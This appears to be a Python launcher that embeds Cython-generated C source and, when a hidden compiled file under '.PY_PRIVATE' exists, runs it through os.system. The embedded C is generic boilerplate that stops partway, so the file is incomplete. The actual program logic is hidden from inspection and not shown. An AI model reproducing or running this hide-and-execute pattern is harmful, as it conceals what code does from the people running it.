
import os
import sys

PSH_TEAM_KEY = "بخ 👀"

EXECUTE_FILE = ".PY_PRIVATE/20250507170509484"
PREFIX = sys.prefix
EXPORT_PYTHONHOME = 'export PYTHONHOME='+PREFIX
EXPORT_PYTHON_EXECUTABLE = 'export PYTHON_EXECUTABLE='+sys.executable

RUN = "./"+EXECUTE_FILE

if os.path.isfile(EXECUTE_FILE):
    os.system(EXPORT_PYTHONHOME+" && "+EXPORT_PYTHON_EXECUTABLE+" && "+RUN)
    exit(0)

C_SOURCE = r'''#ifndef PY_SSIZE_T_CLEAN
#define PY_SSIZE_T_CLEAN
#endif /* PY_SSIZE_T_CLEAN */
#include "Python.h"
#ifndef Py_PYTHON_H
    #error Python headers needed to compile C extensions, please install development version of Python.
#elif PY_VERSION_HEX < 0x02060000 || (0x03000000 <= PY_VERSION_HEX && PY_VERSION_HEX < 0x03030000)
    #error Cython requires Python 2.6+ or Python 3.3+.
#else
#define CYTHON_ABI "0_29_33"
#define CYTHON_HEX_VERSION 0x001D21F0
#define CYTHON_FUTURE_DIVISION 1
#include <stddef.h>
#ifndef offsetof
  #define offsetof(type, member) ( (size_t) & ((type*)0) -> member )
#endif
#if !defined(WIN32) && !defined(MS_WINDOWS)
  #ifndef __stdcall
    #define __stdcall
  #endif
  #ifndef __cdecl
    #define __cdecl
  #endif
  #ifndef __fastcall
    #define __fastcall
  #endif
#endif
#ifndef DL_IMPORT
  #define DL_IMPORT(t) t
#endif
#ifndef DL_EXPORT
  #define DL_EXPORT(t) t
#endif
#define __PYX_COMMA ,
#ifndef HAVE_LONG_LONG
  #if PY_VERSION_HEX >= 0x02070000
    #define HAVE_LONG_LONG
  #endif
#endif
#ifndef PY_LONG_LONG
  #define PY_LONG_LONG LONG_LONG
#endif
#ifndef Py_HUGE_VAL
  #define Py_HUGE_VAL HUGE_VAL
#endif
#ifdef PYPY_VERSION
  #define CYTHON_COMPILING_IN_PYPY 1
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 0
  #undef CYTHON_USE_TYPE_SLOTS
  #define CYTHON_USE_TYPE_SLOTS 0
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #if PY_VERSION_HEX < 0x03050000
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #undef CYTHON_USE_UNICODE_INTERNALS
  #define CYTHON_USE_UNICODE_INTERNALS 0
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #undef CYTHON_AVOID_BORROWED_REFS
  #define CYTHON_AVOID_BORROWED_REFS 1
  #undef CYTHON_ASSUME_SAFE_MACROS
  #define CYTHON_ASSUME_SAFE_MACROS 0
  #undef CYTHON_UNPACK_METHODS
  #define CYTHON_UNPACK_METHODS 0
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0
  #endif
#elif defined(PYSTON_VERSION)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 1
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 0
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #undef CYTHON_USE_ASYNC_SLOTS
  #define CYTHON_USE_ASYNC_SLOTS 0
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0
  #endif
#elif defined(PY_NOGIL)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 1
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #ifndef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT 1
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE 1
  #endif
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
#else
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 1
  #define CYTHON_COMPILING_IN_NOGIL 0
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYTYPE_LOOKUP
    #define CYTHON_USE_PYTYPE_LOOKUP 0
  #elif !defined(CYTHON_USE_PYTYPE_LOOKUP)
    #define CYTHON_USE_PYTYPE_LOOKUP 1
  #endif
  #if PY_MAJOR_VERSION < 3
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYLONG_INTERNALS
    #define CYTHON_USE_PYLONG_INTERNALS 0
  #elif !defined(CYTHON_USE_PYLONG_INTERNALS)
    #define CYTHON_USE_PYLONG_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_PYLIST_INTERNALS
    #define CYTHON_USE_PYLIST_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #if PY_VERSION_HEX < 0x030300F0 || PY_VERSION_HEX >= 0x030B00A2
    #undef CYTHON_USE_UNICODE_WRITER
    #define CYTHON_USE_UNICODE_WRITER 0
  #elif !defined(CYTHON_USE_UNICODE_WRITER)
    #define CYTHON_USE_UNICODE_WRITER 1
  #endif
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #if PY_VERSION_HEX >= 0x030B00A4
    #undef CYTHON_FAST_THREAD_STATE
    #define CYTHON_FAST_THREAD_STATE 0
  #elif !defined(CYTHON_FAST_THREAD_STATE)
    #define CYTHON_FAST_THREAD_STATE 1
  #endif
  #ifndef CYTHON_FAST_PYCALL
    #define CYTHON_FAST_PYCALL (PY_VERSION_HEX < 0x030A0000)
  #endif
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT (PY_VERSION_HEX >= 0x03050000)
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE (PY_VERSION_HEX >= 0x030400a1)
  #endif
  #ifndef CYTHON_USE_DICT_VERSIONS
    #define CYTHON_USE_DICT_VERSIONS (PY_VERSION_HEX >= 0x030600B1)
  #endif
  #if PY_VERSION_HEX >= 0x030B00A4
    #undef CYTHON_USE_EXC_INFO_STACK
    #define CYTHON_USE_EXC_INFO_STACK 0
  #elif !defined(CYTHON_USE_EXC_INFO_STACK)
    #define CYTHON_USE_EXC_INFO_STACK (PY_VERSION_HEX >= 0x030700A3)
  #endif
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 1
  #endif
#endif
#if !defined(CYTHON_FAST_PYCCALL)
#define CYTHON_FAST_PYCCALL  (CYTHON_FAST_PYCALL && PY_VERSION_HEX >= 0x030600B1)
#endif
#if CYTHON_USE_PYLONG_INTERNALS
  #if PY_MAJOR_VERSION < 3
    #include "longintrepr.h"
  #endif
  #undef SHIFT
  #undef BASE
  #undef MASK
  #ifdef SIZEOF_VOID_P
    enum { __pyx_check_sizeof_voidp = 1 / (int)(SIZEOF_VOID_P == sizeof(void*)) };
  #endif
#endif
#ifndef __has_attribute
  #define __has_attribute(x) 0
#endif
#ifndef __has_cpp_attribute
  #define __has_cpp_attribute(x) 0
#endif
#ifndef CYTHON_RESTRICT
  #if defined(__GNUC__)
    #define CYTHON_RESTRICT __restrict__
  #elif defined(_MSC_VER) && _MSC_VER >= 1400
    #define CYTHON_RESTRICT __restrict
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_RESTRICT restrict
  #else
    #define CYTHON_RESTRICT
  #endif
#endif
#ifndef CYTHON_UNUSED
# if defined(__GNUC__)
#   if !(defined(__cplusplus)) || (__GNUC__ > 3 || (__GNUC__ == 3 && __GNUC_MINOR__ >= 4))
#     define CYTHON_UNUSED __attribute__ ((__unused__))
#   else
#     define CYTHON_UNUSED
#   endif
# elif defined(__ICC) || (defined(__INTEL_COMPILER) && !defined(_MSC_VER))
#   define CYTHON_UNUSED __attribute__ ((__unused__))
# else
#   define CYTHON_UNUSED
# endif
#endif
#ifndef CYTHON_MAYBE_UNUSED_VAR
#  if defined(__cplusplus)
     template<class T> void CYTHON_MAYBE_UNUSED_VAR( const T& ) { }
#  else
#    define CYTHON_MAYBE_UNUSED_VAR(x) (void)(x)
#  endif
#endif
#ifndef CYTHON_NCP_UNUSED
# if CYTHON_COMPILING_IN_CPYTHON
#  define CYTHON_NCP_UNUSED
# else
#  define CYTHON_NCP_UNUSED CYTHON_UNUSED
# endif
#endif
#define __Pyx_void_to_None(void_result) ((void)(void_result), Py_INCREF(Py_None), Py_None)
#ifdef _MSC_VER
    #ifndef _MSC_STDINT_H_
        #if _MSC_VER < 1300
           typedef unsigned char     uint8_t;
           typedef unsigned int      uint32_t;
        #else
           typedef unsigned __int8   uint8_t;
           typedef unsigned __int32  uint32_t;
        #endif
    #endif
#else
   #include <stdint.h>
#endif
#ifndef CYTHON_FALLTHROUGH
  #if defined(__cplusplus) && __cplusplus >= 201103L
    #if __has_cpp_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH [[fallthrough]]
    #elif __has_cpp_attribute(clang::fallthrough)
      #define CYTHON_FALLTHROUGH [[clang::fallthrough]]
    #elif __has_cpp_attribute(gnu::fallthrough)
      #define CYTHON_FALLTHROUGH [[gnu::fallthrough]]
    #endif
  #endif
  #ifndef CYTHON_FALLTHROUGH
    #if __has_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH __attribute__((fallthrough))
    #else
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
  #if defined(__clang__ ) && defined(__apple_build_version__)
    #if __apple_build_version__ < 7000000
      #undef  CYTHON_FALLTHROUGH
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
#endif

#ifndef CYTHON_INLINE
  #if defined(__clang__)
    #define CYTHON_INLINE __inline__ __attribute__ ((__unused__))
  #elif defined(__GNUC__)
    #define CYTHON_INLINE __inline__
  #elif defined(_MSC_VER)
    #define CYTHON_INLINE __inline
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_INLINE inline
  #else
    #define CYTHON_INLINE
  #endif
#endif

#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX < 0x02070600 && !defined(Py_OptimizeFlag)
  #define Py_OptimizeFlag 0
#endif
#define __PYX_BUILD_PY_SSIZE_T "n"
#define CYTHON_FORMAT_SSIZE_T "z"
#if PY_MAJOR_VERSION < 3
  #define __Pyx_BUILTIN_MODULE_NAME "__builtin__"
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a+k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
  #define __Pyx_DefaultClassType PyClass_Type
#else
  #define __Pyx_BUILTIN_MODULE_NAME "builtins"
  #define __Pyx_DefaultClassType PyType_Type
#if PY_VERSION_HEX >= 0x030B00A1
    static CYTHON_INLINE PyCodeObject* __Pyx_PyCode_New(int a, int k, int l, int s, int f,
                                                    PyObject *code, PyObject *c, PyObject* n, PyObject *v,
                                                    PyObject *fv, PyObject *cell, PyObject* fn,
                                                    PyObject *name, int fline, PyObject *lnos) {
        PyObject *kwds=NULL, *argcount=NULL, *posonlyargcount=NULL, *kwonlyargcount=NULL;
        PyObject *nlocals=NULL, *stacksize=NULL, *flags=NULL, *replace=NULL, *call_result=NULL, *empty=NULL;
        const char *fn_cstr=NULL;
        const char *name_cstr=NULL;
        PyCodeObject* co=NULL;
        PyObject *type, *value, *traceback;
        PyErr_Fetch(&type, &value, &traceback);
        if (!(kwds=PyDict_New())) goto end;
        if (!(argcount=PyLong_FromLong(a))) goto end;
        if (PyDict_SetItemString(kwds, "co_argcount", argcount) != 0) goto end;
        if (!(posonlyargcount=PyLong_FromLong(0))) goto end;
        if (PyDict_SetItemString(kwds, "co_posonlyargcount", posonlyargcount) != 0) goto end;
        if (!(kwonlyargcount=PyLong_FromLong(k))) goto end;
        if (PyDict_SetItemString(kwds, "co_kwonlyargcount", kwonlyargcount) != 0) goto end;
        if (!(nlocals=PyLong_FromLong(l))) goto end;
        if (PyDict_SetItemString(kwds, "co_nlocals", nlocals) != 0) goto end;
        if (!(stacksize=PyLong_FromLong(s))) goto end;
        if (PyDict_SetItemString(kwds, "co_stacksize", stacksize) != 0) goto end;
        if (!(flags=PyLong_FromLong(f))) goto end;
        if (PyDict_SetItemString(kwds, "co_flags", flags) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_code", code) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_consts", c) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_names", n) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_varnames", v) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_freevars", fv) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_cellvars", cell) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_linetable", lnos) != 0) goto end;
        if (!(fn_cstr=PyUnicode_AsUTF8AndSize(fn, NULL))) goto end;
        if (!(name_cstr=PyUnicode_AsUTF8AndSize(name, NULL))) goto end;
        if (!(co = PyCode_NewEmpty(fn_cstr, name_cstr, fline))) goto end;
        if (!(replace = PyObject_GetAttrString((PyObject*)co, "replace"))) goto cleanup_code_too;
        if (!(empty = PyTuple_New(0))) goto cleanup_code_too; // unfortunately __pyx_empty_tuple isn't available here
        if (!(call_result = PyObject_Call(replace, empty, kwds))) goto cleanup_code_too;
        Py_XDECREF((PyObject*)co);
        co = (PyCodeObject*)call_result;
        call_result = NULL;
        if (0) {
            cleanup_code_too:
            Py_XDECREF((PyObject*)co);
            co = NULL;
        }
        end:
        Py_XDECREF(kwds);
        Py_XDECREF(argcount);
        Py_XDECREF(posonlyargcount);
        Py_XDECREF(kwonlyargcount);
        Py_XDECREF(nlocals);
        Py_XDECREF(stacksize);
        Py_XDECREF(replace);
        Py_XDECREF(call_result);
        Py_XDECREF(empty);
        if (type) {
            PyErr_Restore(type, value, traceback);
        }
        return co;
    }
#else
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
#endif
  #define __Pyx_DefaultClassType PyType_Type
#endif
#ifndef Py_TPFLAGS_CHECKTYPES
  #define Py_TPFLAGS_CHECKTYPES 0
#endif
#ifndef Py_TPFLAGS_HAVE_INDEX
  #define Py_TPFLAGS_HAVE_INDEX 0
#endif
#ifndef Py_TPFLAGS_HAVE_NEWBUFFER
  #define Py_TPFLAGS_HAVE_NEWBUFFER 0
#endif
#ifndef Py_TPFLAGS_HAVE_FINALIZE
  #define Py_TPFLAGS_HAVE_FINALIZE 0
#endif
#ifndef METH_STACKLESS
  #define METH_STACKLESS 0
#endif
#if PY_VERSION_HEX <= 0x030700A3 || !defined(METH_FASTCALL)
  #ifndef METH_FASTCALL
     #define METH_FASTCALL 0x80
  #endif
  typedef PyObject *(*__Pyx_PyCFunctionFast) (PyObject *self, PyObject *const *args, Py_ssize_t nargs);
  typedef PyObject *(*__Pyx_PyCFunctionFastWithKeywords) (PyObject *self, PyObject *const *args,
                                                          Py_ssize_t nargs, PyObject *kwnames);
#else
  #define __Pyx_PyCFunctionFast _PyCFunctionFast
  #define __Pyx_PyCFunctionFastWithKeywords _PyCFunctionFastWithKeywords
#endif
#if CYTHON_FAST_PYCCALL
#define __Pyx_PyFastCFunction_Check(func)\
    ((PyCFunction_Check(func) && (METH_FASTCALL == (PyCFunction_GET_FLAGS(func) & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)))))
#else
#define __Pyx_PyFastCFunction_Check(func) 0
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Malloc)
  #define PyObject_Malloc(s)   PyMem_Malloc(s)
  #define PyObject_Free(p)     PyMem_Free(p)
  #define PyObject_Realloc(p)  PyMem_Realloc(p)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030400A1
  #define PyMem_RawMalloc(n)           PyMem_Malloc(n)
  #define PyMem_RawRealloc(p, n)       PyMem_Realloc(p, n)
  #define PyMem_RawFree(p)             PyMem_Free(p)
#endif
#if CYTHON_COMPILING_IN_PYSTON
  #define __Pyx_PyCode_HasFreeVars(co)  PyCode_HasFreeVars(co)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno) PyFrame_SetLineNumber(frame, lineno)
#else
  #define __Pyx_PyCode_HasFreeVars(co)  (PyCode_GetNumFree(co) > 0)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno)  (frame)->f_lineno = (lineno)
#endif
#if !CYTHON_FAST_THREAD_STATE || PY_VERSION_HEX < 0x02070000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#elif PY_VERSION_HEX >= 0x03060000
  #define __Pyx_PyThreadState_Current _PyThreadState_UncheckedGet()
#elif PY_VERSION_HEX >= 0x03000000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#else
  #define __Pyx_PyThreadState_Current _PyThreadState_Current
#endif
#if PY_VERSION_HEX < 0x030700A2 && !defined(PyThread_tss_create) && !defined(Py_tss_NEEDS_INIT)
#include "pythread.h"
#define Py_tss_NEEDS_INIT 0
typedef int Py_tss_t;
static CYTHON_INLINE int PyThread_tss_create(Py_tss_t *key) {
  *key = PyThread_create_key();
  return 0;
}
static CYTHON_INLINE Py_tss_t * PyThread_tss_alloc(void) {
  Py_tss_t *key = (Py_tss_t *)PyObject_Malloc(sizeof(Py_tss_t));
  *key = Py_tss_NEEDS_INIT;
  return key;
}
static CYTHON_INLINE void PyThread_tss_free(Py_tss_t *key) {
  PyObject_Free(key);
}
static CYTHON_INLINE int PyThread_tss_is_created(Py_tss_t *key) {
  return *key != Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE void PyThread_tss_delete(Py_tss_t *key) {
  PyThread_delete_key(*key);
  *key = Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE int PyThread_tss_set(Py_tss_t *key, void *value) {
  return PyThread_set_key_value(*key, value);
}
static CYTHON_INLINE void * PyThread_tss_get(Py_tss_t *key) {
  return PyThread_get_key_value(*key);
}
#endif
#if CYTHON_COMPILING_IN_CPYTHON || defined(_PyDict_NewPresized)
#define __Pyx_PyDict_NewPresized(n)  ((n <= 8) ? PyDict_New() : _PyDict_NewPresized(n))
#else
#define __Pyx_PyDict_NewPresized(n)  PyDict_New()
#endif
#if PY_MAJOR_VERSION >= 3 || CYTHON_FUTURE_DIVISION
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_TrueDivide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceTrueDivide(x,y)
#else
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_Divide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceDivide(x,y)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1 && CYTHON_USE_UNICODE_INTERNALS
#define __Pyx_PyDict_GetItemStr(dict, name)  _PyDict_GetItem_KnownHash(dict, name, ((PyASCIIObject *) name)->hash)
#else
#define __Pyx_PyDict_GetItemStr(dict, name)  PyDict_GetItem(dict, name)
#endif
#if PY_VERSION_HEX > 0x03030000 && defined(PyUnicode_KIND)
  #define CYTHON_PEP393_ENABLED 1
  #if PY_VERSION_HEX >= 0x030C0000
    #define __Pyx_PyUnicode_READY(op)       (0)
  #else
    #define __Pyx_PyUnicode_READY(op)       (likely(PyUnicode_IS_READY(op)) ?\
                                                0 : _PyUnicode_Ready((PyObject *)(op)))
  #endif
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_LENGTH(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) PyUnicode_READ_CHAR(u, i)
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   PyUnicode_MAX_CHAR_VALUE(u)
  #define __Pyx_PyUnicode_KIND(u)         PyUnicode_KIND(u)
  #define __Pyx_PyUnicode_DATA(u)         PyUnicode_DATA(u)
  #define __Pyx_PyUnicode_READ(k, d, i)   PyUnicode_READ(k, d, i)
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  PyUnicode_WRITE(k, d, i, ch)
  #if PY_VERSION_HEX >= 0x030C0000
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_LENGTH(u))
  #else
    #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03090000
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : ((PyCompactUnicodeObject *)(u))->wstr_length))
    #else
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : PyUnicode_GET_SIZE(u)))
    #endif
  #endif
#else
  #define CYTHON_PEP393_ENABLED 0
  #define PyUnicode_1BYTE_KIND  1
  #define PyUnicode_2BYTE_KIND  2
  #define PyUnicode_4BYTE_KIND  4
  #define __Pyx_PyUnicode_READY(op)       (0)
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_SIZE(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) ((Py_UCS4)(PyUnicode_AS_UNICODE(u)[i]))
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   ((sizeof(Py_UNICODE) == 2) ? 65535 : 1114111)
  #define __Pyx_PyUnicode_KIND(u)         (sizeof(Py_UNICODE))
  #define __Pyx_PyUnicode_DATA(u)         ((void*)PyUnicode_AS_UNICODE(u))
  #define __Pyx_PyUnicode_READ(k, d, i)   ((void)(k), (Py_UCS4)(((Py_UNICODE*)d)[i]))
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  (((void)(k)), ((Py_UNICODE*)d)[i] = ch)
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_SIZE(u))
#endif
#if CYTHON_COMPILING_IN_PYPY
  #define __Pyx_PyUnicode_Concat(a, b)      PyNumber_Add(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  PyNumber_Add(a, b)
#else
  #define __Pyx_PyUnicode_Concat(a, b)      PyUnicode_Concat(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  ((unlikely((a) == Py_None) || unlikely((b) == Py_None)) ?\
      PyNumber_Add(a, b) : __Pyx_PyUnicode_Concat(a, b))
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyUnicode_Contains)
  #define PyUnicode_Contains(u, s)  PySequence_Contains(u, s)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyByteArray_Check)
  #define PyByteArray_Check(obj)  PyObject_TypeCheck(obj, &PyByteArray_Type)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Format)
  #define PyObject_Format(obj, fmt)  PyObject_CallMethod(obj, "__format__", "O", fmt)
#endif
#define __Pyx_PyString_FormatSafe(a, b)   ((unlikely((a) == Py_None || (PyString_Check(b) && !PyString_CheckExact(b)))) ? PyNumber_Remainder(a, b) : __Pyx_PyString_Format(a, b))
#define __Pyx_PyUnicode_FormatSafe(a, b)  ((unlikely((a) == Py_None || (PyUnicode_Check(b) && !PyUnicode_CheckExact(b)))) ? PyNumber_Remainder(a, b) : PyUnicode_Format(a, b))
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyString_Format(a, b)  PyUnicode_Format(a, b)
#else
  #define __Pyx_PyString_Format(a, b)  PyString_Format(a, b)
#endif
#if PY_MAJOR_VERSION < 3 && !defined(PyObject_ASCII)
  #define PyObject_ASCII(o)            PyObject_Repr(o)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBaseString_Type            PyUnicode_Type
  #define PyStringObject               PyUnicodeObject
  #define PyString_Type                PyUnicode_Type
  #define PyString_Check               PyUnicode_Check
  #define PyString_CheckExact          PyUnicode_CheckExact
#ifndef PyObject_Unicode
  #define PyObject_Unicode             PyObject_Str
#endif
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyBaseString_Check(obj) PyUnicode_Check(obj)
  #define __Pyx_PyBaseString_CheckExact(obj) PyUnicode_CheckExact(obj)
#else
  #define __Pyx_PyBaseString_Check(obj) (PyString_Check(obj) || PyUnicode_Check(obj))
  #define __Pyx_PyBaseString_CheckExact(obj) (PyString_CheckExact(obj) || PyUnicode_CheckExact(obj))
#endif
#ifndef PySet_CheckExact
  #define PySet_CheckExact(obj)        (Py_TYPE(obj) == &PySet_Type)
#endif
#if PY_VERSION_HEX >= 0x030900A4
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_SET_REFCNT(obj, refcnt)
  #define __Pyx_SET_SIZE(obj, size) Py_SET_SIZE(obj, size)
#else
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_REFCNT(obj) = (refcnt)
